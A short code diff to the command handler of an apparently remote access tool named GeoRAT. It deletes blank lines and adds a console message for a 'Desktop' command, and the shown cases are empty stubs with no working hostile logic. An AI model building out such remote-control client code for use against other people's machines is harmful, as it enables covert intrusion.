@@ -3,7 +3,6 @@ using System.Diagnostics;
 using System.Runtime.InteropServices;
 
 
-
 namespace GeoRAT.Client.CommandHandlers
 {
     class CommandHandler
@@ -12,8 +11,6 @@ namespace GeoRAT.Client.CommandHandlers
       
         public void Handle(Commands command)
         {
-
-
 
             switch (command.CommandType)
             {
@@ -37,7 +34,8 @@ namespace GeoRAT.Client.CommandHandlers
                 case "Download":
                     break;
                 case "Desktop":
-                     
+                    Console.WriteLine("Remote desktop command received, sending desktop");
+                  
                     break;
 
             }
